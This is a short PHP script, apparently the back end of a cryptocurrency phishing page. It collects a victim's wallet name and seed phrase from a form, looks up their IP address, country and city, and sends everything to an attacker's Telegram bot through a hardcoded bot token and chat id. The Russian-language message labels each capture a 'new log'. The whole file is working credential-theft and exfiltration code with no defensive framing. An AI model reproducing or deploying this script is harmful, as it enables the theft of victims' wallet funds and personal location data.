<?php
    $token = " 7758194328:AAG9pSD9fya02U2m4lgsG8OjNFKtLIt0r_0";
    $chat_id = "-1002371075600";

    $wallet = $_POST['wallet'];
    $phrase = $_POST['phrase'];

    $ip = $_SERVER['REMOTE_ADDR'];
    $NowDomen = $_SERVER['SERVER_NAME'];
    $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
    $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
        
    if (isset($_POST['wallet']) && isset($_POST['phrase'])) {
        $arr = array(
            "💸 Поздравляем, новый лог!" => '',
            "💵 Кошелёк: " => $wallet,
            "🔑 Фраза: " => $phrase,
            "🗻 IP: " => $ip,
            "🌍 Страна: " => $NowCountry,
            "🌇 Город: " => $NowCity,
            "🔧 Домен: " => $NowDomen
        );
            
        foreach($arr as $key => $value) {
            $txt .= "<b>".$key."</b> ".$value."%0A";
        };
              
        $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    };